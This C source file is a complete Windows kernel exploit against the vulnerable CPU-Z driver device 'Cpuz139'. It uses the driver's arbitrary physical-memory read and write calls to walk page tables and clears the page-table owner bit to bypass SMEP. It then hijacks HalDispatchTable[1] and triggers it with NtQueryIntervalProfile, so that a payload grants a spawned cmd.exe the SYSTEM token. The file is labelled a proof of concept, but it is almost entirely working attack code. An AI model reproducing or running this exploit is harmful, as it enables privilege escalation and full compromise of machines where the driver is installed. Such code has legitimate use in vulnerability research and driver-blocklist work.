#include "Cpuz.h"

#include "Internal.h"

#include <Windows.h>
#include <stdio.h>

#define DEVICE_NAME L"Cpuz139"
#define DEVICE_PATH L"\\\\.\\" DEVICE_NAME

#define DECLARE_SYMBOL(name)  name##_t g_##name = NULL

// Global to save the overwritten function pointer
PVOID g_HalDispatchTableEntry = NULL;

PROCESS_INFORMATION g_NewProcess = { 0 };

// Pointers for the exploit and payload
typedef PVOID * HalDispatchTable_t;
DECLARE_SYMBOL(HalDispatchTable);
DECLARE_SYMBOL(ZwOpenProcess);
DECLARE_SYMBOL(ZwOpenProcessTokenEx);
DECLARE_SYMBOL(ZwDuplicateToken);
DECLARE_SYMBOL(ZwSetInformationProcess);


BOOL ReadControlRegister(
    __in HANDLE hDevice,
    __in ULONG Register,
    __out PULONGLONG Value)
{
    BOOL bSuccess = TRUE;
    DWORD nBytesReturned = 0;
    READ_CONTROL_REGISTER params = { 0 };

    params.in.Register = Register;

    bSuccess = DeviceIoControl(
        hDevice,
        IOCTL_READ_CONTROL_REGISTER,
        &params.in,
        sizeof(params.in),
        &params.out,
        sizeof(params.out),
        &nBytesReturned,
        NULL);
    if (bSuccess) {
        *Value = params.out.Value;
    }

    return bSuccess;
}


BOOL ReadPhysicalMemory(
    __in HANDLE hDevice,
    __in ULONGLONG PhysicalAddress,
    __out PVOID Buffer,
    __in ULONG Size)
{
    DWORD nBytesReturned = 0;
    READ_PHYSICAL_MEMORY params = { 0 };

    params.in.PhysicalAddressHigh = PhysicalAddress >> 32;
    params.in.PhysicalAddressLow = PhysicalAddress & 0xffffffff;
    params.in.Size = Size;
#ifdef _M_AMD64
    params.in.BufferAddressHigh = (ULONG_PTR)Buffer >> 32;
#else
    params.in.BufferAddressHigh = 0;
#endif
    params.in.BufferAddressLow = (ULONG_PTR)Buffer & 0xffffffff;

    return DeviceIoControl(
        hDevice,
        IOCTL_READ_PHYSICAL_MEMORY,
        &params.in,
        sizeof(params.in),
        &params.out,
        sizeof(params.out),
        &nBytesReturned,
        NULL);
}


// We can only write in DWORD increments
BOOL WritePhysicalMemory(
    __in HANDLE hDevice,
    __in ULONGLONG PhysicalAddress,
    __in ULONG Value)
{
    DWORD nBytesReturned = 0;
    WRITE_PHYSICAL_MEMORY params = { 0 };

    params.in.PhysicalAddressHigh = PhysicalAddress >> 32;
    params.in.PhysicalAddressLow = PhysicalAddress & 0xffffffff;
    params.in.Value = Value;
        
    return DeviceIoControl(
        hDevice,
        IOCTL_WRITE_PHYSICAL_MEMORY,
        &params.in,
        sizeof(params.in),
        &params.out,
        sizeof(params.out),
        &nBytesReturned,
        NULL);
}


BOOL GetPte(
    __in HANDLE hDevice,
    __in ULONGLONG Cr3,
    __in ULONG_PTR VirtualAddress,
    __out PHARDWARE_PTE PteOut,
    __out_opt PULONGLONG PteAddress)
{
    BOOL bSuccess = TRUE;
    ULONGLONG PdeBase = 0;
    ULONGLONG PteBase = 0;
    ULONGLONG PointerPte = 0;
    HARDWARE_PTE Pte = { 0 };

#ifdef _AMD64_
    ULONGLONG PxeBase = Cr3;
    PointerPte = PxeBase + PXE_OFFSET(VirtualAddress) * sizeof(PVOID);
    bSuccess = ReadPhysicalMemory(hDevice, PointerPte, &Pte, sizeof(Pte));
    if (!bSuccess || Pte.Valid == 0) {
        return false;
    }

    ULONGLONG PpeBase = Pte.PageFrameNumber << 12;
    PointerPte = PpeBase + PPE_OFFSET(VirtualAddress) * sizeof(PVOID);
    bSuccess = ReadPhysicalMemory(hDevice, PointerPte, &Pte, sizeof(Pte));
    if (!bSuccess || Pte.Valid == 0) {
        return false;
    }

    PdeBase = Pte.PageFrameNumber << 12;
#else
    PdeBase = Cr3;
#endif

    PointerPte = PdeBase + PDE_OFFSET(VirtualAddress) * sizeof(PVOID);
    bSuccess = ReadPhysicalMemory(hDevice, PointerPte, &Pte, sizeof(Pte));
    if (!bSuccess || Pte.Valid == 0) {
        return false;
    }

    if (Pte.LargePage) {
        goto DONE;
    }

    PteBase = Pte.PageFrameNumber << 12;
    PointerPte = PteBase + PTE_OFFSET(VirtualAddress) * sizeof(PVOID);
    bSuccess = ReadPhysicalMemory(hDevice, PointerPte, &Pte, sizeof(Pte));
    if (!bSuccess || Pte.Valid == 0) {
        return false;
    }

DONE:
    if (PteAddress) {
        *PteAddress = PointerPte;
    }
    *PteOut = Pte;
    return true;
}


BOOL DisableSmep(
    __in HANDLE hDevice,
    __in ULONGLONG Cr3,
    __in ULONG_PTR VirtualAddress,
    __in ULONG VirtualSize)
{
    BOOL bSuccess = true;
    DWORD nPages = (VirtualSize + (PAGE_SIZE - 1)) / PAGE_SIZE;
    ULONGLONG PteAddress = 0;
    HARDWARE_PTE Pte;

    for (DWORD i = 0; i < nPages; i++) {
        bSuccess = GetPte(hDevice, Cr3, VirtualAddress + i * PAGE_SIZE, &Pte, &PteAddress);
        if (!bSuccess) {
            return false;
        }

        // Set the U/S bit
        Pte.Owner = 0;

        // Write the low-order DWORD
        bSuccess = WritePhysicalMemory(hDevice, PteAddress, *(PULONG)&Pte);
        if (!bSuccess) {
            return false;
        }

#ifdef _AMD64_
        // Write the high-order DWORD
        bSuccess = WritePhysicalMemory(hDevice, PteAddress + sizeof(ULONG), *((PULONG)&Pte + 1));
        if (!bSuccess) {
            return false;
        }
#endif
    }

    return true;
}


ULONGLONG GetPhysicalAddress(
    __in HANDLE hDevice,
    __in ULONGLONG Cr3,
    __in ULONG_PTR VirtualAddress)
{
    BOOL bSuccess = TRUE;
    HARDWARE_PTE Pte;

    bSuccess = GetPte(hDevice, Cr3, VirtualAddress, &Pte, NULL);
    if (!bSuccess) {
        return 0;
    }

    if (Pte.LargePage) {
        return (Pte.PageFrameNumber << 12) + (VirtualAddress & 0x3fffff);
    }
    return (Pte.PageFrameNumber << 12) + (VirtualAddress & 0xfff);
}


BOOL ReadVirtualMemory(
    __in HANDLE hDevice,
    __in ULONGLONG Cr3,
    __in PVOID VirtualAddress,
    __out PVOID Buffer,
    __in ULONG Size)
{
    ULONGLONG PhysicalAddress = GetPhysicalAddress(hDevice, Cr3, (ULONG_PTR)VirtualAddress);
    if (PhysicalAddress == NULL) {
        SetLastError(STATUS_ACCESS_VIOLATION);
        return FALSE;
    }

    return ReadPhysicalMemory(hDevice, PhysicalAddress, Buffer, Size);
}


BOOL WriteVirtualMemory(
    __in HANDLE hDevice,
    __in ULONGLONG Cr3,
    __in PVOID VirtualAddress,
    __in PVOID Buffer,
    __in SIZE_T Size)
{
    BOOL bSuccess = TRUE;

    if (Size % sizeof(ULONG) != 0) {
        SetLastError(ERROR_OFFSET_ALIGNMENT_VIOLATION);
        return FALSE;
    }

    for (SIZE_T i = 0; i < Size / sizeof(ULONG); i++) {
        PULONG addr = (PULONG)VirtualAddress + i;
        ULONGLONG PhysicalAddress = GetPhysicalAddress(hDevice, Cr3, (ULONG_PTR)addr);
        if (PhysicalAddress == NULL) {
            SetLastError(STATUS_ACCESS_VIOLATION);
            return FALSE;
        }

        bSuccess = WritePhysicalMemory(hDevice, PhysicalAddress, ((PULONG)Buffer)[i]);
        if (!bSuccess) {
            return FALSE;
        }
    }

    return TRUE;
}


BOOL GetNtosInformation(
    __out PULONG_PTR BaseAddress,
    __out LPSTR Filepath)
{
    HMODULE Ntdll = GetModuleHandleA("ntdll.dll");
    if (Ntdll == NULL) {
        return FALSE;
    }

    NtQuerySystemInformation_t NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(Ntdll, "NtQuerySystemInformation");
    if (NtQuerySystemInformation == NULL) {
        return FALSE;
    }

    ULONG cbModuleInfo = 0;
    NTSTATUS retval = NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &cbModuleInfo);
    if (retval != STATUS_INFO_LENGTH_MISMATCH) {
        return FALSE;
    }

    PSYSTEM_MODULES pModules = (PSYSTEM_MODULES)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbModuleInfo);
    if (pModules == NULL) {
        SetLastError(ERROR_NOT_ENOUGH_MEMORY);
        return FALSE;
    }

    retval = NtQuerySystemInformation(SystemModuleInformation, pModules, cbModuleInfo, NULL);
    if (retval != STATUS_SUCCESS) {
        HeapFree(GetProcessHeap(), 0, pModules); 
        SetLastError(retval);
        return FALSE;
    }
    
    for (DWORD i = 0; i < pModules->Count; i++) {
        PSYSTEM_MODULE_INFORMATION pModuleInfo = &pModules->Modules[i];
        LPSTR szName = pModuleInfo->ImageName + pModuleInfo->ModuleNameOffset;
        if (strcmp(szName, "ntoskrnl.exe") == 0 ||
            strcmp(szName, "ntkrnlpa.exe") == 0 ||
            strcmp(szName, "ntkrnlmp.exe") == 0 ||
            strcmp(szName, "ntkrpamp.exe") == 0)
        {
            *BaseAddress = (ULONG_PTR)pModuleInfo->Base;
            strcpy_s(Filepath, MAX_PATH, "C:\\Windows\\System32\\");
            strcat_s(Filepath, MAX_PATH, szName);
            HeapFree(GetProcessHeap(), 0, pModules);
            return TRUE;
        }
    }

    HeapFree(GetProcessHeap(), 0, pModules);
    SetLastError(ERROR_NOT_FOUND);
    return FALSE;
}


// Find function pointers in the kernel
BOOL ResolveKernelSymbols(VOID)
{
    // Get kernel base address and file path
    ULONG_PTR NtosBaseAddress = 0;
    CHAR szNtosPath[MAX_PATH] = { 0 };
    BOOL bSuccess = GetNtosInformation(&NtosBaseAddress, szNtosPath);
    if (!bSuccess) {
        return FALSE;
    }

    // Map the kernel into userspace
    HMODULE Ntos = LoadLibraryExA(szNtosPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (Ntos == NULL) {
        return FALSE;
    }

    // Resolve any function pointers needed for the exploit and payload
#define RESOLVE_SYMBOL(name) do { \
    ULONG_PTR addr = (ULONG_PTR)GetProcAddress(Ntos, #name); \
    if (addr == NULL) { \
        printf("[-] Error resolving kernel symbol: %s\n", #name); \
        FreeLibrary(Ntos); \
        return FALSE; \
    } \
    g_##name = (name##_t)(NtosBaseAddress + (addr - (ULONG_PTR)Ntos)); \
} while (0);

    RESOLVE_SYMBOL(HalDispatchTable);
    RESOLVE_SYMBOL(ZwOpenProcess);
    RESOLVE_SYMBOL(ZwOpenProcessTokenEx);
    RESOLVE_SYMBOL(ZwDuplicateToken);
    RESOLVE_SYMBOL(ZwSetInformationProcess);

    FreeLibrary(Ntos);
    return TRUE;
}


/**
 * @brief Payload that will be executed with kernel-mode privileges.
 *
 * The PTE for the page this code is located on will have the u/s bit flipped
 * to KernelMode, allowing this function to invoke kernel mode functions. As
 * a proof of concept, this function will assign the system process's token to
 * the current process, however it can be modified to take any other kernel
 * mode action.
 */
static ULONG WINAPI Payload(
    ULONG a,
    ULONG b,
    ULONG c,
    ULONG d)
{
    // Restore the HalDispatchTable
    g_HalDispatchTable[1] = g_HalDispatchTableEntry;

    // Open the system process
    HANDLE hSystemProcess = NULL;
    OBJECT_ATTRIBUTES oa;
    CLIENT_ID ClientId = { (HANDLE)4, 0 };
    InitializeObjectAttributes(&oa, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
    NTSTATUS retval = g_ZwOpenProcess(&hSystemProcess, PROCESS_ALL_ACCESS, &oa, &ClientId);
    if (retval != STATUS_SUCCESS) {
        return 0;
    }

    // Open the system token
    HANDLE hSystemToken = NULL;
    retval = g_ZwOpenProcessTokenEx(hSystemProcess, TOKEN_ALL_ACCESS | TOKEN_ASSIGN_PRIMARY, OBJ_KERNEL_HANDLE, &hSystemToken);
    if (retval != STATUS_SUCCESS) {
        return 0;
    }

    // Duplicate the system token
    HANDLE hDuplicatedToken = NULL;
    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
    retval = g_ZwDuplicateToken(hSystemToken, MAXIMUM_ALLOWED, &oa, FALSE, TokenPrimary, &hDuplicatedToken);
    if (retval != STATUS_SUCCESS) {
        return 0;
    }
     
    // Update our process token
    PROCESS_ACCESS_TOKEN TokenInformation = { hDuplicatedToken, 0 };
    retval = g_ZwSetInformationProcess(g_NewProcess.hProcess, ProcessAccessToken, &TokenInformation, sizeof(TokenInformation));
    if (retval != STATUS_SUCCESS) {
        return 0;
    }
    
    return 0;
}
static ULONG WINAPI PayloadEnd(void)
{
    return 0;
}

int main(int argc, char *argv[])
{
    BOOL bSuccess = TRUE;
    HANDLE hDevice = INVALID_HANDLE_VALUE;
    ULONGLONG Cr3 = 0;
    PVOID pPayload = NULL;
    ULONG_PTR cbPayload = (ULONG_PTR)PayloadEnd - (ULONG_PTR)Payload;   // PoC code - we assume that PayloadEnd immediately follows Payload in the obj file

    // Open the vulnerable device
    hDevice = CreateFileW(
        DEVICE_PATH,
        0,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Could not open device: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] Opened device %ws Handle=0x%zx\n", DEVICE_PATH, (size_t)hDevice);

    // Get CR3 value so we can read/write all virtual memory
    bSuccess = ReadControlRegister(hDevice, 3, &Cr3);
    if (!bSuccess) {
        printf("[-] Could not get page table base: %lu\n", GetLastError());
        CloseHandle(hDevice);
        return 1;
    }
    printf("[+] Read CR3: 0x%llx\n", Cr3);

    // Resolve kernel addresses needed for the exploit/payload
    bSuccess = ResolveKernelSymbols();
    if (!bSuccess) {
        printf("[-] Could not resolve kernel symbols: %lu\n", GetLastError());
        CloseHandle(hDevice);
        return 1;
    }
    printf("[+] Resolved kernel functions\n");

    // Copy the payload to a new page since disabling SMEP will make the whole page KernelMode
    pPayload = VirtualAlloc(NULL, cbPayload, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pPayload == NULL) {
        printf("[-] Could not allocate memory for payload: %lu\n", GetLastError());
        return 1;
    }
    memcpy(pPayload, Payload, cbPayload);
    printf("[*] Copied payload to 0x%p\n", pPayload);

    // Overwrite the second entry in HalDispatchTable with a pointer to our payload
    // Save the original value of the entry
    bSuccess = ReadVirtualMemory(hDevice, Cr3, &g_HalDispatchTable[1], &g_HalDispatchTableEntry, sizeof(PVOID));
    if (!bSuccess) {
        printf("[-] Could not save HalDispatchTable entry: %lu\n", GetLastError());
        CloseHandle(hDevice);
        return 1;
    }
    printf("[+] Saved HalDispatchTable[1]: 0x%p\n", g_HalDispatchTableEntry);

    // Write our function pointer
    bSuccess = WriteVirtualMemory(hDevice, Cr3, &g_HalDispatchTable[1], &pPayload, sizeof(PVOID));
    if (!bSuccess) {
        printf("[-] Could not overwrite HalDispatchTable entry: %lu\n", GetLastError());
        CloseHandle(hDevice);
        return 1;
    }
    printf("[+] Overwrote HalDispatchTable[1] with userspace function pointer: 0x%p\n", pPayload);

    // Disable SMEP by marking our payload as a supervisor page
    bSuccess = DisableSmep(hDevice, Cr3, (ULONG_PTR)pPayload, cbPayload);
    if (!bSuccess) {
        printf("[-] Could not update payload U/S PTE entry");
        CloseHandle(hDevice);
        return 1;
    }
    printf("[+] Disabled SMEP for payload\n");

    // Create a new suspended process
    printf("[*] Spawning suspended process...\n");
    STARTUPINFO si = { 0 };
    bSuccess = CreateProcess(NULL, "cmd.exe", NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NEW_CONSOLE, NULL, NULL, &si, &g_NewProcess);
    if (!bSuccess) {
        printf("[-] Could not spawn process  error=%lu\n", GetLastError());
        CloseHandle(hDevice);
        return 1;
    }

    // Find NtQueryIntervalProfile in order to trigger the exploit
    HMODULE Ntdll = GetModuleHandleA("ntdll.dll");
    if (Ntdll == NULL) {
        CloseHandle(hDevice);
        return 1;
    }

    NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(Ntdll, "NtQueryIntervalProfile");
    if (NtQueryIntervalProfile == NULL) {
        CloseHandle(hDevice);
        return 1;
    }

    // Trigger the exploit
    printf("[*] Triggering exploit...\n");
    ULONG Junk = 0;
    NtQueryIntervalProfile(2, &Junk);    

    printf("[*] Resuming suspended process...\n");
    ResumeThread(g_NewProcess.hThread);

    printf("[+] Done\n");
    CloseHandle(hDevice);
    return 0;
}
